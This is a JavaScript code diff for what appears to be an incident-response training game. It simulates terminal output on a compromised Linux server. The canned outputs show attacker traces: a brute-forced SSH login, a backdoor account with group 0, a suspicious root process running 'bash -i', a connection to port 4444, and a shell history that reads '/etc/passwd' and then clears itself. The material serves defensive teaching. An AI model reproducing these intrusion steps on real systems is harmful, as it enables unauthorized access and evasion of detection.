+    if(gLower.includes('svc_backup') && gLower.includes('auth.log')) return `May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`;
+    if(gLower.includes('185.220') && gLower.includes('auth.log')) return `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2\n[... 46 more lines from 185.220.101.42 ...]\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`;
+    return `grep: no matches found`;
+  }
+
+  // ── nmap ──────────────────────────────────────────────────────────────────
+  if(verb === 'nmap') {
+    if(parts.length === 1) return `Usage: nmap [options] target\nTry: nmap localhost  or  nmap -sV localhost  or  nmap -sV -sC localhost`;
+    const hasV = lower.includes('-sv');
+    const hasC = lower.includes('-sc');
+    const target = parts[parts.length-1];
+    const ip = (target === 'localhost' || target === '127.0.0.1') ? '127.0.0.1' : '10.0.0.4';
+    const host = ip === '127.0.0.1' ? 'localhost' : 'clearpath-prod-01 (10.0.0.4)';
+    let out = `Starting Nmap 7.80\nNmap scan report for ${host}\nHost is up (0.00008s latency).\nNot shown: 997 closed ports\n`;
+    if(hasV) {
+      out += `PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n3306/tcp open  mysql   MySQL 8.0.36-0ubuntu0.22.04.1\n`;
+      if(hasC) out += `\nWARNING: Port 3306 (MySQL) is accessible from outside — no firewall rule blocking this port.\n`;
+    } else {
+      out += `PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n`;
+    }
+    out += `\nNmap done: 1 IP address (1 host up)`;
+    return out;
+  }
+
+  // ── simple built-ins ──────────────────────────────────────────────────────
+  const builtins = {
+    'whoami':       'analyst',
+    'hostname':     'clearpath-prod-01',
+    'uname -a':     'Linux clearpath-prod-01 5.15.0-100-generic #110-Ubuntu SMP x86_64 GNU/Linux',
+    'uname':        'Linux',
+    'date':         'Mon May 18 08:31:44 UTC 2026',
+    'uptime':       ' 8:31am  up 47 days,  3:22,  2 users,  load average: 0.08, 0.12, 0.10',
+    'id':           'uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)',
+    'crontab -l':   '# Analyst crontab — nothing scheduled\nno crontab for analyst',
+    'crontab -l -u root': 'crontab: must be privileged to use -u',
+    'last':         'svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\n\nwtmp begins Tue Apr  1 09:00:00 2026',
+    'last -20':     'svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\nbilling_svc pts/0     10.0.0.8         Fri May 16 07:55 - 08:40  (00:45)\njreyes   pts/0        10.0.0.5         Thu May 15 09:11 - 17:02  (07:51)',
+    'ps aux':       'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1  22520  1024 ?        Ss   Apr01   0:04 /sbin/init\nroot       412  0.0  0.3  72184  3200 ?        Ss   Apr01   0:00 /usr/sbin/sshd -D\nroot      3847  0.0  0.1   4628  1024 ?        Ss   02:14   0:00 /tmp/.update_check\nroot      3849  0.0  0.0      0     0 ?        S    02:14   0:00 bash -i\nmysql     1203  0.0  2.1 558432 21448 ?        Ssl  Apr01   3:11 /usr/sbin/mysqld\nwww-data  1301  0.0  0.5 287612  5120 ?        Ss   Apr01   0:01 /usr/sbin/apache2\nanalyst   4201  0.0  0.1  21316  1024 pts/0    Ss   08:31   0:00 -bash\nanalyst   4298  0.0  0.0  37368   772 pts/0    R+   08:31   0:00 ps aux',
+    'netstat -an':  'Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN\ntcp        0    128 10.0.0.4:22             185.220.101.42:31337    ESTABLISHED\ntcp        0      0 10.0.0.4:54321          185.220.101.42:4444     ESTABLISHED',
+    'ss -tuln':     'Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port\ntcp    LISTEN  0       128          0.0.0.0:22        0.0.0.0:*\ntcp    LISTEN  0       80           0.0.0.0:80        0.0.0.0:*\ntcp    LISTEN  0       70         127.0.0.1:3306      0.0.0.0:*',
+    'history':      '    1  ls\n    2  cat /etc/passwd\n    3  ls /tmp\n    4  history -c\n    5  ls -la\n    6  history',
+    'sudo su':      'sudo: This incident is under investigation. Privilege escalation has been restricted.',
+    'sudo -l':      '[sudo] password for analyst:\nSorry, user analyst may not run sudo on clearpath-prod-01.',
+    'exit':         'Session remains open for investigation.',
+    'help':         'Available commands:\nNavigation: cd <path>, cd .., cd ~, pwd, ls, ls -a, ls -la\nFiles:       cat <file>, strings <file>, file <file>\nNetwork:     netstat -an, ss -tuln, nmap localhost, nmap -sV localhost, nmap -sV -sC localhost\nLogs:        cat /var/log/auth.log, grep -i "failed" /var/log/auth.log, grep -i "accepted" /var/log/auth.log\nSystem:      whoami, id, hostname, uname -a, uptime, date, ps aux, last, history\nScheduled:   crontab -l, cat /etc/crontab, ls /etc/cron.d\nOther:       clear\n\nTIP: cd accepts any path — try "cd /var/log" or "cd .." or "cd ~"\nTIP: ls only shows visible files. Use "ls -a" to reveal hidden dot files.',
+  };
+
+  if(builtins[lower] !== undefined) return builtins[lower];
+  if(builtins[cmd]   !== undefined) return builtins[cmd];
+
+  if(lower === 'clear') { document.getElementById('terminal-output').innerHTML = ''; return null; }
+
+  return `bash: ${verb}: command not found`;
 }
 
 // ===================== AUTH.LOG DOWNLOAD =====================
